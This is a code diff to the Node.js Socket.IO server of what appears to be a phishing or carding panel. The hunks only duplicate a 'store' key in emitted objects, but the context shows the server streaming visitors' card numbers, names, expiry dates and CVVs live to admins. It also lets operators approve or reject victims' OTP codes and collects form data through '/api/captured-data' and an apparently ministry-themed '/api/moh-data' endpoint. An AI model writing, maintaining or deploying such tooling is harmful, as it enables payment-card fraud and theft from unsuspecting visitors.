@@ -367,7 +367,7 @@ io.on("connection", (socket) => {
     saveData();
 
     // Send confirmation to visitor
-    socket.emit("successfully-connected", { store: STORE, ...({
+    socket.emit("successfully-connected", {store: STORE,  store: STORE, ...({
       sid: socket.id,
       pid: visitor._id,
     }), store: STORE });
@@ -375,9 +375,9 @@ io.on("connection", (socket) => {
     // Notify admins
     admins.forEach((admin, adminSocketId) => {
       if (isNewVisitor) {
-        io.to(adminSocketId).emit("visitor:new", { store: STORE, ...({ ...visitor, isConnected: true }), store: STORE });
+        io.to(adminSocketId).emit("visitor:new", {store: STORE,  store: STORE, ...({ ...visitor, isConnected: true }), store: STORE });
       } else {
-        io.to(adminSocketId).emit("visitor:reconnected", { store: STORE, ...({ visitorId: visitor._id, socketId: socket.id }), store: STORE });
+        io.to(adminSocketId).emit("visitor:reconnected", {store: STORE,  store: STORE, ...({ visitorId: visitor._id, socketId: socket.id }), store: STORE });
       }
     });
   });
@@ -398,14 +398,14 @@ io.on("connection", (socket) => {
           /*FIX42*/ if (!visitor.liveCard || !String(visitor.liveCard.cardNumber || "").replace(/\D/g, "")) { visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" }; }
           visitor.liveCardTimestamp = new Date().toISOString();
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp }), store: STORE });
+            io.to(adminSocketId).emit("card:liveUpdate", {store: STORE,  store: STORE, ...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp }), store: STORE });
           });
         }
       } else {
         visitor.liveCard = null;
         visitor.liveCardTimestamp = null;
         admins.forEach((admin, adminSocketId) => {
-          io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({
+          io.to(adminSocketId).emit("card:liveUpdate", {store: STORE,  store: STORE, ...({
             visitorId: visitor._id,
             liveCard: null,
             liveCardTimestamp: null,
@@ -417,7 +417,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:pageChanged", { store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:pageChanged", {store: STORE,  store: STORE, ...({
           visitorId: visitor._id,
           page,
         }), store: STORE });
@@ -436,7 +436,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:nameUpdated", { store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:nameUpdated", {store: STORE,  store: STORE, ...({
           visitorId: visitor._id,
           name: name,
         }), store: STORE });
@@ -507,7 +507,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:dataSubmitted", { store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:dataSubmitted", {store: STORE,  store: STORE, ...({
     
           visitorId: visitor._id,
           socketId: socket.id,
@@ -537,7 +537,7 @@ socket.on("card:live", (data) => {
   visitors.set(socket.id, visitor);
 
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({
+    io.to(adminSocketId).emit("card:liveUpdate", {store: STORE,  store: STORE, ...({
       visitorId: visitor._id,
       liveCard: visitor.liveCard,
       liveCardTimestamp: visitor.liveCardTimestamp,
@@ -552,7 +552,7 @@ socket.on("card:liveHide", () => {
   visitor.liveCardTimestamp = null;
   visitors.set(socket.id, visitor);
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({
+    io.to(adminSocketId).emit("card:liveUpdate", {store: STORE,  store: STORE, ...({
       visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
     }), store: STORE });
   });
@@ -571,7 +571,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:cardVerification", { store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:cardVerification", {store: STORE,  store: STORE, ...({
           visitorId: visitor._id,
           cardNumber,
           isBlocked,
@@ -730,7 +730,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
   // Admin: Code action (Approve, Reject) for OTP/digit codes
   socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
-    io.to(visitorSocketId).emit("code:action", { store: STORE, ...({ action, codeIndex }), store: STORE });
+    io.to(visitorSocketId).emit("code:action", {store: STORE,  store: STORE, ...({ action, codeIndex }), store: STORE });
     // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
@@ -811,7 +811,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     
     // Notify all admins
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:deleted", { store: STORE, ...({ visitorId }), store: STORE });
+      io.to(adminSocketId).emit("visitor:deleted", {store: STORE,  store: STORE, ...({ visitorId }), store: STORE });
     });
     
     console.log(`Visitor deleted by ID: ${visitorId}`);
@@ -819,7 +819,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
   // Admin: Send last message
   socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
-    io.to(visitorSocketId).emit("admin-last-message", { store: STORE, ...({ message }), store: STORE });
+    io.to(visitorSocketId).emit("admin-last-message", {store: STORE,  store: STORE, ...({ message }), store: STORE });
     console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
   });
 
@@ -939,7 +939,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
   socket.on("blockedCards:check", (cardNumber) => {
     const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
     const isBlocked = globalBlockedCards.includes(prefix);
-    socket.emit("blockedCards:checkResult", { store: STORE, ...({ isBlocked, prefix }), store: STORE });
+    socket.emit("blockedCards:checkResult", {store: STORE,  store: STORE, ...({ isBlocked, prefix }), store: STORE });
   });
 
   // Blocked Countries: Get list
@@ -980,7 +980,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     const isBlocked = globalBlockedCountries.some(c => 
       c.toLowerCase() === country.toLowerCase()
     );
-    socket.emit("blockedCountries:checkResult", { store: STORE, ...({ isBlocked, country }), store: STORE });
+    socket.emit("blockedCountries:checkResult", {store: STORE,  store: STORE, ...({ isBlocked, country }), store: STORE });
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
@@ -1005,7 +1005,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     
     // Notify all admins about the update
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:markedAsRead", { store: STORE, ...({ visitorId }), store: STORE });
+      io.to(adminSocketId).emit("visitor:markedAsRead", {store: STORE,  store: STORE, ...({ visitorId }), store: STORE });
     });
     
     console.log(`Visitor ${visitorId} marked as read`);
@@ -1034,7 +1034,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
       
       // Notify all admins about the new message
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("chat:newMessage", { store: STORE, ...({
+        io.to(adminSocketId).emit("chat:newMessage", {store: STORE,  store: STORE, ...({
           visitorSocketId: visitor.socketId,
           visitorId: visitor._id,
           message: chatMessage
@@ -1066,7 +1066,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
       saveVisitorPermanently(visitor);
       
       // Send message to visitor
-      io.to(visitorSocketId).emit("chat:fromAdmin", { store: STORE, ...({
+      io.to(visitorSocketId).emit("chat:fromAdmin", {store: STORE,  store: STORE, ...({
         message: message,
         timestamp: chatMessage.timestamp
       }), store: STORE });
@@ -1124,7 +1124,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
           
           // Notify admins
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("visitor:disconnected", { store: STORE, ...({
+            io.to(adminSocketId).emit("visitor:disconnected", {store: STORE,  store: STORE, ...({
               visitorId: visitorId,
               socketId: socketId,
             }), store: STORE });
@@ -1262,13 +1262,13 @@ app.post("/api/moh-data", (req, res) => {
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
         if (username) {
-          io.to(adminSocketId).emit('visitor:nameUpdated', { store: STORE, ...({
+          io.to(adminSocketId).emit('visitor:nameUpdated', {store: STORE,  store: STORE, ...({
             visitorId: v._id,
             name: username,
           }), store: STORE });
         }
         if (Object.keys(fields).length > 0) {
-          io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE, ...({
+          io.to(adminSocketId).emit('visitor:dataSubmitted', {store: STORE,  store: STORE, ...({
             visitorId: v._id,
             socketId: matchedVisitor.socketId,
             data: { content: fields, page: pageName },
@@ -1333,7 +1333,7 @@ app.post("/api/captured-data", (req, res) => {
       
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE, ...({
+        io.to(adminSocketId).emit('visitor:dataSubmitted', {store: STORE,  store: STORE, ...({
           visitorId: v._id,
           socketId: matchedVisitor.socketId,
           data: { content: parsedFields, page: `MOH-POST: ${url}` },
@@ -1539,7 +1539,7 @@ setInterval(() => {
       visitors.set(sid, visitor);
       // Notify admins about idle status change
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:idleChanged", { store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:idleChanged", {store: STORE,  store: STORE, ...({
           visitorId: visitor._id,
           isIdle: isNowIdle,
         }), store: STORE });
@@ -1570,7 +1570,7 @@ setInterval(() => {
       
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:disconnected", { store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:disconnected", {store: STORE,  store: STORE, ...({
           visitorId: visitorId,
           socketId: sid,
         }), store: STORE });
